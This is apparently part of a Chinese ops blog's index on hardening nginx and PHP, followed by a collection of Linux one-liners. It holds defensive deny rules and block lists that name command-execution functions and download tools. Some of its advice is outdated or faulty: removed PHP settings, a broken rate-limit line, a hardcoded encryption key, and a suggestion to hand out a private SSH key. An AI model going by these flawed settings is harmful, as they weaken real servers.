","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:17:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.12.2. 不记录不需要的日志 在实际工作中，对于负载均衡器的健康检查节点或某些特定文件(如图片、js、css等)的日志，一般不需要记录下来，因为在PV时是按照页面计算的。而且日志写入太频繁会大量消耗磁盘IO，降低服务器性能. 网络流量度量术语 独立(公网)ip数: 指的是不同IP地址的计算机访问网站时被计算的总次数。独立IP书是衡量网站流量的一个重要指标。一般一天内相同IP地址的客户端访问网站页面只被计算为一次，记录独立IP的时间可以为一天或一个月，目前通常标准为一天; PV 访问量: 即Page View 页面浏览，即页面浏览量或点击量，不管客户端是不是相同，也不管ip是不是相同，用户每次访问一个网站页面都会被计算一个PV。具体度量方法就是从客户浏览器发出一个对web服务器的请求，web服务器接到这个请求后，将该请求对应的一个网页发给浏览器，就产生了一个pv。但是只要这个请求发送给了浏览器，无论这个页面是否完全打开(或下载完成)，那么都会被(服务器日志)计数为一个PV，一般为了防止用户快速刷PV，都是把PV的统计程序放在页面的最下面。 UV 独立访客数: 同一个客户端(PC或移动端) 访问网站被计算为一个访客，一天内相同的客户端访问同一个网站只计算一次UV，UV一般是以客户端Cookie等计算作为统计依据，实际统计会有误差。一台客户端可能忽悠多人使用的情况，因此，UV实际上并不一定是独立的自然人访问。 配置方法: 这里的location标签匹配不记录日志的元素扩展名，然后关掉了日志。 location ~ .*\\.(js|jpg|JPG|jpeg|JPEG|css|bmp|gif|GIF)$ { access_log off; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:17:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.12.3. 访问日志权限设置 限制用户及组为root , 修改目录权限 600 ,nginx访问日志的权限即使是root，nginx也是可以读取的 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:17:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.13. nginx 站点目录及文件URL控制 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:18:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.13.1. 根据文件扩展名限制程序和文件访问 示例: location ~ ^/image/.*\\.(php|php5|sh|pl|py)${ deny all; } location ~ ^/static/.*\\.(php|php5|sh|pl|py)${ deny all; } location ~ ^/data/(attachment|avatar)/.*\\.(php|php5)${ deny all; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:18:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.13.2. 限制网站来源IP访问 location ~ ^/admin/{ allow xx.xx.xx.xx; allow xx.xx.xx.xx/xx; # deny xx.xx.xx.xx; deny all; } 使用if来限制客户端ip if ($remote_addr = 10.0.0.7 ) { return 403; } if ($remote_addr = xx.xx.xx.xx ) { set $allow_access_root 'true'; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:18:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.13.3. 配置nginx禁止非法域名解析 问题： 如何防止用户IP访问网站(恶意域名解析，也相当于ip访问网站) 解决：让使用ip访问网站的用户，或者恶意解析域名的用户，收到501错误。(需要放到所有server之前) server { listen 80 default_server; server_name _; return 501; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:18:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.14. 防盗链 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:19:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.14.1. 解决方案 根据http_referer实现防盗链 示例: # server location ~* ^.+\\.(jpg|png|swf|flv)$ { valid_referers none bloked *.example.com; if ($invalid_referer) { #rewrite ^/ https://www.example.com/daolian.png; return 403; } } 根据cookie防盗链 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:19:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.15. 错误页面优雅显示 示例: # error_page 可以多行，每行对应一个状态码 error_page 500 502 503 504 404 /50x_error.html; # 若集群，建议选择域名跳转，统一分配 # error_page 500 502 503 504 404 http://www.example.com/erro_page; fastcgi_intercept_errors on; 默认 off ,这个指令指定的是是否传递 4xx和 5xx信息到客户端，或允许nginx 使用error_page处理错误信息。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:20:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.16. 站点目录权限优化 目录权限755,文件权限644，用户及组root，用户上传目录nginx服务用户.(减少文件上传目录权限) ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:21:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.17. 防爬虫优化 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:22:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.17.1. robots.txt 机器人协议 网站通过robots(网站根目录存放robots.txt)协议告诉搜索引擎哪些页面可以抓取，那些页面不能抓取。 示例: User-agent: * Disallow: / Sitemap: https://www.example.com/sitemap.xml ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:22:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.17.2. nginx 防爬虫优化配置 示例: # server|location if ($http_user_agent ~* \"LWP::Simple|BBBike|wget\") { return 403; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:22:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.18. nginx 限制http请求方法 示例: # 屏蔽非GET|HEAD|POST的请求方法 # server|location if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 501; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:23:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.19. 使用cdn做网站内容加速 cdn全国或全球的分布式缓存集群 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:24:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.20. 网站架构优化 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:25:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.20.1. 为网站程序解耦 指的是把一堆程序代码按照业务用途分开，然后提供服务。例如: 注册登陆、上传、下载、浏览列表、商品内容页面、订单支付等都应该是独立的程序服务。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:25:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.21. nginx 监牢模式 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:26:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.21.1. nginx 服务降权解决方案 解决方案: 给nginx 服务降权，用普通用户(假设普通用户为www )跑nginx 服务，给开发和运维设置普通用户帐号，将开发和运维的帐号设置为与www 同组即可管理nginx，该方案解决了nginx管理问题，防止root分配权限过大。 开发人员使用普通用户即可管理nginx 服务及站点下的程序和日志。 采取项目负责制度，即谁负责的项目维护出了问题就是谁负责。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:26:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.22. 控制nginx并发连接数 示例: # 定义 # http limit_conn_zone $binary_remote_addr zone=addr:10m; #使用(seerver/location) limit_conn addr 1; ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:27:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.23. 控制 nginx请求 # 定义 # http limit_req_zone $binary_remote_addr zone=one;10m rate=1r/s; #使用(seerver/location) limit_req zone=one burst=5; ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:28:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4. php 优化 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:29:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.1. php 参数调优 php.ini-development与php.ini-production的区别是日志的开启与隐藏 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:30:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.1.1. php.ini 安全参数调优 ; 打开安全模式(防止system()函数可调用系统命令)，5.5以上已无该参数 safe_mode = On ; safe_mode 打开时，safe_mode_gid被关闭，那么php脚本能够对文件进行访问，而且同组的用户也能狗对文件进行访问。设置off进行关闭,5.5以上已无该参数 safe_mode_gid = Off ; 关闭危险函数(phpinfo,passthru,exec,shell_exec,system,popen,proc_open,proc_get_status,chroot,scandir,chgrp,chown,readdir,ls_dir,ini_set,ini_alter,ini_restore,dl,pfsockopen,fsocket,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,rmdir,chmod,closedir,opendir,dir,fileperms,copy,delfile),默认无限制 disable_functions = phpinfo ; 关闭php版本信息(默认On) expose_php = Off ; 关闭注册全局变量,5.5以上已无该参数 register_globals = Off ; 防止sql注入(打开后自动把用户体检对sql的查询进行转换,例如把'转换为\\),默认Off,5.5以上已无该参数 magic_quotes_gpc = On ; 错误信息输出控制,默认On ; 建议在关闭display_errors后能够把错误信息记录下来，便于查找服务器运行的原因: ; log_errors = On ; error_log = /var/log/php_error.log display_errors = Off ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:30:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.1.2. php.ini 优化参数调优 ; 每个脚本最大允许执行时间(s),0 表示没有限制 max_execution_time = 30 ; 每个脚本使用的最大内存,要能够使用该指令编译时必须启用 --enable-memory-limit 选项 memory_limit = 128M ; 每个脚本等待输入数据的最长时间 ,-1 表示不限制 max_input_time = 60 ; 上传文件的最大许可 upload_max_filesize = 2M ; 最大上传的文件数量(可同时上传多少个文件),默认20 max_file_uploads = 20 ; http post 数据的大小 (请求包的大小)，默认8M post_max_size = 8M ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:30:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.1.3. php.ini 安全优化 ; 禁止打开远程地址,默认On allow_url_fopen = Off ; 防止nginx文件类型错误解析漏洞,默认1 cgi.fix_pathinfo = 0 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:30:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.1.4. php session 会话保持 集群环境，一般会将session存放于memcache中，多个集群节点连接同一个memcache，保证用户session处于在线状态 php.ini 修改 ; 调整php session 信息存放类型,默认文件 files session.save_handler = memcache ; session 保存位置,默认tmp session.save_path = \"tcp://10.0.0.18:11211\" ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:30:4","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.2. php-fpm 调优 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:31:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"4.2.1. php-fpm.conf 调优 ; 打开进程pid pid = run/php-fpm.pid ; 打开php-fpm 进程错误日志 error_log = log/php-fpm.log ; 错误日志级别 ， 默认notice log_level = error ; 最大的php-fpm进程数量(静态),默认128 process.max = 128 ; 文件描述符，默认1024 rlimit_files = 10240 ; 表示在emergency_restart_interval时间内，出现SIGEGV或者SIGBUS错误的php-cgi进程数如果超过了 ; emergency_restart_threshold个，则php-cgi就会优雅重启 emergency_restart_interval = 60s emergency_restart_threshold = 60 ; ; 池定义 ; 与nginx用户一样 [www] user = www group = www ; 监听 listen = 127.0.0.1:9000 ; 控制允许访问的客户端 listen.allowed_clients = 127.0.0.1 ; 进程模式,默认动态,开启后需配合pm.max_children，pm.start_servers，pm.min_spare_servers，pm.max_spare_servers参数进行设置 pm = dynamic ; 同一时间，最大可创建的子进程的数量(静态模式下由此参数固定进程数) pm.max_children = 300 ; 设置启动时创建的子进程数目 pm.start_servers = 20 ; pm.*_spare_servers 设置空闲服务进程的最低/最大数目 pm.min_spare_servers = 20 pm.max_spare_servers = 300 ; 进程的超时时间，当进程不提供服务后，多少秒关闭,默认10s pm.process_idle_timeout = 10s ; 一个子进程处理多少个请求后退出，默认 0 pm.max_requests = 10240 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:31:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"收集了一些常用和有趣的命令","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"引入一个更为专业的命令收集站点 : https://www.commandlinefu.com/commands/browse ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"统计第一列相同，第二列平均值 cat xxx |awk '{a[$1]+=$2;c[$1]++}END{l=asorti(a,b);for(i=1;i\u003c=l;i++)print b[i],a[b[i]]/c[b[i]]}' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:1:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"时间段统计日志： sed -n '/2018:02:30/,/2018:03:00/p' www.log |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n sed -n '/2018:01:50/,/2018:02:00/p' www.log |grep \"list?\" |awk '{a[$1]+=1;} END {for(i in a){print a[i]\" \"i;}}' |sort -t \" \" -k 1 -n ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:2:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"按照 ip 排序 # 升序 sort -t'.' -k1,1n -k2,2n -k3,3n -k4,4n ip.txt # 降序 sort -t'.' -k1,1nr -k2,2nr -k3,3nr -k4,4nr ip.txt ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:3:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"shell 中获取脚本绝对路径 SHELL_DIR=$(dirname $(readlink -f \"$0\")) SHELL_DIR=$(cd `dirname $0`; pwd) ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:4:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"tailf 显示高亮 tail -f www.log | perl -pe 's/(\\/pattern1\\/pattern2)/\\e[1;31m$1\\e[0m/g' tail -f www.log |grep --color -E 'pattern|$' ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:5:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"openssl 通过证书加密解密大文件 mkdir /etc/encrypt \u0026\u0026 cd /etc/encrypt openssl genrsa -out private.pem 2048 openssl rsa -in private.pem -outform PEM -pubout -out public.pem openssl rand -base64 32 \u003e key.bin # 远程传输建议每次都新建 # 加密 openssl rsautl -encrypt -pubin -inkey /etc/encrypt/public.pem -in /etc/encrypt/key.bin -out /etc/encrypt/key.bin.enc openssl aes-256-cfb -a -pbkdf2 -salt -in filename.gz -out filename.gz.enc -k $(cat /etc/encrypt/key.bin) # 解密 openssl rsautl -decrypt -inkey private.pem -in key.bin.enc -out key.bin openssl aes-256-cfb -d -a -pbkdf2 -in filename.gz.enc -out filename.gz -k $(cat key.bin) # 加密 tar -czf - * | openssl aes-256-cfb -salt -k \"8CASiU6zxAWy9QZ8wj+MgIzqHsBnXjgkHNvWeJ0urHw=\" -out ssh.key.pem.enc openssl aes-256-cfb -d -salt -in ssh.key.pem.enc -out ssh_key.pem.tar.gz ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:6:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"免密登陆 # 172.16.10.11 无密码登陆 172.16.10.12 # 172.16.10.11 生成秘钥 # rsa 默认 2048 ssh-keygen -t rsa -b 2048 # 然后一直回车，可以设置认证密码 # id_rsa 私钥(不要外传) # id_rsa.pub (公钥导入本地authorized_keys(600)中，将私钥传给客户端，客户端即可通过私钥连接当前服务器) # 将本地的秘钥复制到服务器上就可以了,或者拷贝追加到服务器的authorized_keys文件中，即可本地登陆远程主机 ssh-copy-id -i ~/.ssh/id_rsa.pub root@172.16.10.12 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:7:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"手动检测: 每分钟连接次数 netstat -ntu | awk '{print $5}' |cut -d: -f1|sort|uniq -c |sort -n netstat -an |grep ^tcp.*:80|egrep -v 'LISTEN|127.0.0.1'|awk -F\"[ ]+|[:]\" '{print $6}'|sort|uniq -c|sort -rn ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:8:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 用 tcpdump 查看 80 端口访问有哪些 IP tcpdump -i eth0 -tnn dst port 80 -c 1000|awk -F\".\" '{print $1\".\"$2\".\"$3\".\"$4}'|sort|uniq -c|sort -rn|head -n20 ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:9:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"查看 linux 内存占用最高的 10 个进程 ps aux|head -1 \u0026\u0026 ps aux|grep -v PID|sort -rn -k +4|head ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:10:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看 cpu 占用最高的 10 个进程 ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:11:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看命令来源于那个包(yum 也适用) dnf provides htop ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:12:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看已安装的命令原来于那个包 rpm -qf /usr/bin/htop ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:13:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看 rpm 包信息 rpm -qpi xxx.rpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:14:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看 rpm 包内容 rpm -qpl xxx.rpm ","date":"2019-07-23","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:15:0","tags":["linux","解决方案"],"title":"常用命令收集","uri":"/posts/linux/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"linux 查看 rpm 包依赖 rpm -qpR xxx.rpm 